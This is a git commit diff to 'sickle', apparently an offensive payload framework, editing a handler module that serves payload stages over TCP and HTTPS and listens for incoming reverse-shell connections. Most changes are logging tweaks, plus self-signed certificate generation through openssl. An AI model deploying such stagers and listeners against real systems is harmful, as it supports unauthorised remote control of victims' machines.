f6156ad16b59e0444d247bd96995d4fad962a21b
wetw0rk <mvalen1997@gmail.com>
2025-09-29 18:56:16 -0500

    Pushing changes to handler

--- src/sickle/modules/handler.py
+++ src/sickle/modules/handler.py
@@ -23,7 +23,7 @@ class TCPStagerHandler(socketserver.StreamRequestHandler):
         """Handles TCP connection
         """
 
-        log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
+        log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}\n")
         self.request.send(struct.pack('<Q', len(self.server.stage)))
         self.request.send(self.server.stage)
 
@@ -38,7 +38,7 @@ class SimpleTTYHandler(socketserver.StreamRequestHandler):
         """Handles the TCP session
         """
 
-        log_print(f"Connection established with {self.client_address[0]}\n")
+        log_print(f"Connection established with {self.client_address[0]}\n\n")
 
         while True:
 
@@ -66,7 +66,7 @@ class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):
         """
 
         if (self.server.uri_path in self.path):
-            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
+            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}\n")
             self.wfile.write(struct.pack('<Q', len(self.server.stage)))
             self.wfile.write(self.server.stage)
 
@@ -149,6 +149,25 @@ class Module():
         else:
             self.uri_path = argv_dict["PATH"]
 
+        # Set the CERT path that is used by HTTPS if there is not one present, create it
+        if "CERT" not in argv_dict.keys():
+            current_directory = os.path.dirname(os.path.abspath(__file__))
+            if os.path.isfile(f"{current_directory}/cert.pem") == False:
+                log_print("It appears that the HTTPS handler does not have a default certificate generated\n")
+                log_print("Would you like to generate one (Y/N): ")
+                create_cert = input()
+                if (create_cert.lower() == 'y') or (create_cert.lower() == 'yes'):
+                    cmd = f"openssl req -new -x509 -keyout {current_directory}/cert.pem -out {current_directory}/cert.pem -days 31337 -nodes"
+                    log_print(f"Executing: {cmd}\n")
+                    os.system(cmd)
+
+            self.cert = f"{current_directory}/cert.pem"
+        else:
+            self.cert = argv_dict["CERT"]
+            if os.path.isfile(self.cert) == False:
+                log_print("Unable to open {self.cert}\n")
+                exit(-1)
+
     def do_thing(self):
 
         if self.handler == "tty":
@@ -158,18 +177,18 @@ class Module():
         elif self.handler == "https":
             self.start_https_handler()
         else:
-            print(f"{self.handler} is not a valid handler")
+            print(f"{self.handler} is not a valid handler\n")
             exit(-1)
 
     def start_https_handler(self):
         
         s_addr = (self.srvhost, self.srvport)
         httpd = http.server.HTTPServer(s_addr, HTTPSStagerHandler)
-        log_print(f"HTTPSStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")
+        log_print(f"HTTPSStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}\n")
 
         sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         sslctx.check_hostname = False
-        sslctx.load_cert_chain(certfile='/opt/Sickle-Windows-Reverse-Shell/src/sickle/modules/de_cert.pem',
+        sslctx.load_cert_chain(certfile=self.cert,
                                keyfile=None,
                                password=None)
 
@@ -192,7 +211,7 @@ class Module():
         """
 
         stage_server = socketserver.TCPServer((self.srvhost, self.srvport), TCPStagerHandler)
-        log_print(f"TCPStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")
+        log_print(f"TCPStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}\n")
         stage_server.stage = self.stage
         stage_server.serve_forever()
 
@@ -204,7 +223,7 @@ class Module():
         :rtype: None
         """
 
-        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
+        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}\n")
         server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
         server.serve_forever()
 
@@ -220,6 +239,6 @@ def log_print(msg):
     """
 
     elapsed = time.time() - time_start
-    print(f"[{elapsed:12.6f}] {msg}")
+    sys.stdout.write(f"[{elapsed:12.6f}] {msg}")
     
     return
